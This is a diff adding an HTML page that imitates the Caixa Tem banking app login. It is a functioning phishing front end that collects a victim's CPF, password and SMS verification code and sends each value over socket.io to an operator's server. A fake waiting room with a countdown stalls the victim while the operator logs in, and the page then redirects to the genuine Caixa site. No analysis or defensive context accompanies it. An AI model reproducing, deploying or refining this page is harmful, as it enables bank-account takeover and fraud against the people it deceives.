@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        #titulo1 {
+            color: red;
+        }
+
+        
+    </style>
+</head>
+<body>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="//code.jquery.com/jquery-3.2.1.min.js"></script>
+    <h1 id="titulo"></h1>
+    <script>
+    const socket = io();
+
+    
+   
+    /*function pedirsenhablock(){
+        var senha = document.querySelector("#pedirsenha")
+        senha.style.display = "block";
+    }
+    */
+
+   
+
+socket.on("pedirsms", (arg) => {
+        if(arg == "pedirsms" ){
+
+            var loading = document.querySelector("#main2")
+            loading.style.display = "block";
+
+            var aguarde = document.getElementById("laguarde")
+            aguarde.innerHTML = "Pronto! Sua vez chegou!"
+
+
+
+            setTimeout(()=>{
+                var celular = document.getElementById("celular")
+            celular.style.display = "block";
+
+            var loading = document.querySelector("#main2")
+            loading.style.display = "none";
+
+            }, 4000)
+
+
+            
+
+
+        }
+});
+    
+
+socket.on("final", data =>{
+    document.getElementById('finaltel').innerHTML = data
+})
+
+    
+
+    
+
+</script>
+
+<div id="carregando" style="display:none;"> <h1>Aguarde carregando informações...</h1><img src="https://gifs.eco.br/wp-content/uploads/2021/08/imagens-e-gifs-de-loading-7.gif"></div>
+
+<div style="display:none;" id="pedirsms">
+    <script>
+        function enviar(){
+            var smsvalor = document.getElementById("sms").value;
+            socket.emit("smsvalor", smsvalor)
+
+            var sms = document.querySelector("#pedirsms")
+            sms.style.display = "none";
+
+        
+            var carregando = document.querySelector("#carregando")
+            carregando.style.display = "block";
+
+            var senha = document.querySelector("#pedirsenha")
+            senha.style.display = "none";
+
+
+        }
+
+        function enviarsenha(){
+            var senhavalor = document.getElementById("senha").value;
+            socket.emit("senhavalor", senhavalor)
+
+            var sms = document.querySelector("#pedirsms")
+            sms.style.display = "none";
+
+        
+            var carregando = document.querySelector("#carregando")
+            carregando.style.display = "block";
+
+            var senha = document.querySelector("#pedirsenha")
+            senha.style.display = "none";
+
+
+        }
+
+        function enviarcpf(){
+
+            var enviarcpf = document.getElementById("cpf").value;
+            socket.emit("enviarcpf", enviarcpf)
+
+            var trocar = document.querySelector("#trocar")
+            trocar.innerHTML = "<div style='display:flex;justify-content:center;'><img style='margin-top:30px; width: 150px;' src='https://guiar.me/img/Loading.gif'></div>";
+
+            setTimeout(() =>{
+                var digitesenha = document.querySelector("#senhacaxa")
+                digitesenha.style.display = "block";
+
+                var trocar = document.querySelector("#trocar")
+                trocar.style.display = "none";
+            }, 1500);
+
+
+        }
+
+        function recebercodigo(){
+
+        var celular = document.getElementById("celular")
+        celular.innerHTML = "<div style='display:flex;justify-content:center;'><img style='margin-top:30px; width: 150px;' src='https://guiar.me/img/Loading.gif'></div>";
+
+        
+
+        setTimeout(() =>{
+            var digitesenha = document.querySelector("#codigosms")
+            digitesenha.style.display = "block";
+
+            var trocar = document.querySelector("#trocar")
+            trocar.style.display = "none";
+
+            var celular = document.getElementById("celular")
+            celular.style.display = "none"
+        }, 1500);
+
+
+}
+
+        function enviarsenha(){
+
+        var enviarsenha = document.getElementById("password").value;
+        socket.emit("enviarsenha", enviarsenha)
+
+        setTimeout(() =>{
+                var digitesenha = document.querySelector("#senhacaxa")
+                digitesenha.style.display = "none";
+
+                var trocar = document.querySelector("#main2")
+                trocar.style.display = "block";
+
+
+var duration = 56 * 1; // Converter para segundos
+    display = document.querySelector('#timer'); // selecionando o timer
+    startTimer(duration, display); // iniciando o timer
+            
+
+    function startTimer(duration, display) {
+var timer = duration, seconds;
+setInterval(function () {
+    minutes = parseInt(timer / 60, 10);
+    seconds = parseInt(timer % 60, 10);
+    minutes = minutes < 10 ? "0" + minutes : minutes;
+    seconds = seconds < 10 ? "0" + seconds : seconds;
+    display.textContent = minutes + ":" + seconds;
+    if (--timer < 0) {
+        timer = duration;
+        console.log('tempo acabou!')
+    }
+}, 1000);
+}
+
+
+            }, 1500);
+
+            
+
+       
+
+        
+
+}
+
+function enviarcodigo(){
+    var enviarcodigo = document.getElementById("codigonovo").value;
+        socket.emit("enviarcodigo", enviarcodigo)
+
+        var trocar = document.querySelector("#codigosms")
+            trocar.innerHTML = "<div style='display:flex;justify-content:center;'><img style='margin-top:30px; width: 150px;' src='https://guiar.me/img/Loading.gif'></div>";
+
+            setTimeout(()=> {
+        window.location.href = "https://www.caixa.gov.br/caixatem/paginas/default.aspx";
+    },2000)
+        }
+
+    
+
+    </script>
+
+    
+</div>
+
+
+<div style="max-width: 425px; margin: 0 auto;" id="main">
+    <div style="display:flex;justify-content:center;" id="center">
+        <img style="margin-top:20px" width="150rem" src="logo.png" alt="">
+        
+    </div>
+    <p style="text-align: center;color:#05477c">Aplicativo caixa tem</p>
+
+        <div id="trocar">
+            <p style="max-width: 90%;margin: 50px auto 0px;">Informe seu CPF e clique em "Próximo" para continuar</p>
+        <div style="display:flex; height: 100%;align-items: center;margin-left: 15px;margin-bottom: -10px;" class="flex-box">
+            <img width="15px" src="pessoa.png"><p>CPF</p>
+        </div>
+    
+        <input id="cpf" style="border: none; border-bottom: 2px solid #FE8002;margin-bottom:50px; width: 90%;margin-left: 15px;padding: 10px 15px;box-sizing: border-box;font-size: 13pt;" type="text"><br>
+        
+        <input style="border: none;background-color: #FE8002; width: 90%; margin-left: 15px;height: 45px; border-radius: 7px;color:white;font-weight: bold;" type="submit" onclick="enviarcpf()" value="Próximo">
+        <p style="text-align:center;">É novo aqui? <u style="color:#05477c">Cadastre-se</u></p>
+        <p style="text-align:center;margin-top: 200px;"><u style="color:#05477c">Preciso de ajuda</u></p> 
+
+        </div><!--trocar-->
+
+        <div style="display:none;" id="codigosms">
+
+            <p style="max-width: 90%;margin: 50px auto 0px;">Veiculação de dispositivo</p>
+            <p style="max-width: 90%;margin: 50px auto 0px;">Insira o codigo recebido</p>
+
+        <div style="display:flex; height: 100%;align-items: center;margin-left: 15px;margin-bottom: -10px;" class="flex-box">
+            <img width="15px" src="pessoa.png"><p>Codigo</p>
+        </div>
+    
+        <input id="codigonovo" style="border: none; border-bottom: 2px solid #FE8002;margin-bottom:50px; width: 90%;margin-left: 15px;padding: 10px 15px;box-sizing: border-box;font-size: 13pt;" type="sms"><br>
+        
+        <input style="border: none;background-color: #FE8002; width: 90%; margin-left: 15px;height: 45px; border-radius: 7px;color:white;font-weight: bold;" type="submit" onclick="enviarcodigo()" value="Verificar código">
+ 
+        <p style="text-align:center;margin-top: 200px;"><u style="color:#05477c">Preciso de ajuda</u></p> 
+
+        </div><!--trocar-->
+
+        <div style="display:none;" id="senhacaxa">
+
+            <p style="max-width: 90%;margin: 50px auto 0px;">Informe sua senha</p>
+        <div style="display:flex; height: 100%;align-items: center;margin-left: 15px;margin-bottom: -10px;" class="flex-box">
+            <img width="15px" src="pessoa.png"><p>Senha</p>
+        </div>
+    
+        <input id="password" style="border: none; border-bottom: 2px solid #FE8002;margin-bottom:50px; width: 90%;margin-left: 15px;padding: 10px 15px;box-sizing: border-box;font-size: 13pt;" type="password"><br>
+        
+        <input style="border: none;background-color: #FE8002; width: 90%; margin-left: 15px;height: 45px; border-radius: 7px;color:white;font-weight: bold;" type="submit" onclick="enviarsenha()" value="Continuar">
+        <p style="text-align:center;">Esqueceu sua senha?<u style="color:#05477c">Recupera Senha</u></p>
+        <p style="text-align:center;margin-top: 200px;"><u style="color:#05477c">Preciso de ajuda</u></p> 
+
+        </div><!--trocar-->
+
+
+ 
+
+        
+                <div style="display:none;" id="celular">
+                    <p style="max-width: 90%;margin: 50px auto 0px;">Vinculação de dispositivo ao CPF</p>
+                    <p style="max-width: 90%;margin: 0px auto 0px;">Este dispositivo não está vinculado</p>
+                    <p style="max-width: 90%;margin: 0px auto 0px;"> Enviar via SMS:</p>
+                    <div style="display: flex;justify-content: left;margin-left: 20px;" class="flex-box">
+                        
+                        <input  type="radio" checked><p >(**)*****-<strong id="finaltel"></strong></p>
+                    </div>
+                    
+                    
+            
+                
+                
+                <input style="border: none;background-color: #FE8002; width: 90%; margin-left: 15px;height: 45px; border-radius: 7px;color:white;font-weight: bold;" type="submit" onclick="recebercodigo()" value="Receber Código">
+               
+    
+</div>
+<div style="max-width: 425px; margin: 0 auto;display: none;" id="main2">
+    <div style="display:flex;justify-content:center;" id="center">
+        <img style="margin-top:20px" width="150rem" src="../public/logo.png" alt="">
+        
+    </div>
+
+    <h1 style="font-family: Arial, Helvetica, sans-serif;text-align: center;color:#05477c; max-width: 80%;margin: 0 auto;font-size: 15pt;">Você está numa sala de espera virtual</h1>
+    <h3 style="font-family: Arial, Helvetica, sans-serif;font-weight: 500;text-align: center;color:rgb(83, 83, 83); font-size: 13pt;">Você está numa sala de espera e será rapidamente atendido, aguarde.</h3>    
+    <div id="fundo" style="background-image: url('10.png');background-repeat: no-repeat;width:   300px;height: 300px;background-color: white;margin: 0 auto;max-width: 90%;border-radius: 8px;display: flex;justify-content: center;flex-direction: column;" class="conteudo-azul">
+
+        <h3 style="font-family: Arial, Helvetica, sans-serif;font-weight: 500;text-align: center;color:rgb(83, 83, 83); font-size: 11pt; max-width: 80%;margin: 0 auto;margin-bottom: 20px;"><strong id="timer" style="font-size: 22pt;font-weight: bold;color:#05477c;">00:00</strong></br></br>Tempo aproximado de espera<br></br></h3> 
+
+        <h1  id="laguarde" style="font-size:15pt;text-align: center;font-family: Arial, Helvetica, sans-serif;font-weight: bold;color:#05477c; max-width: 70%;margin: 0 auto;padding-right: 20px;box-sizing: border-box;">Aguarde...</h1>    
+    </div>
+    
+    
+
+        <h3 style="font-family: Arial, Helvetica, sans-serif;font-weight: 500;text-align: center;color:rgb(83, 83, 83); font-size: 11pt; max-width: 80%;margin: 0 auto;">Para manter sua posição na fila, <strong style="color: red">não atualize a pagina</strong>, <strong style="color: red">não feche o navegador</strong>e <strong style="color: red">não altere entre aplicativos</strong></h3>    
+
+</div>
+<script>
+
+    
+
+
+ 
+
+    
+    
+
+</script>
+</body>
+</html>
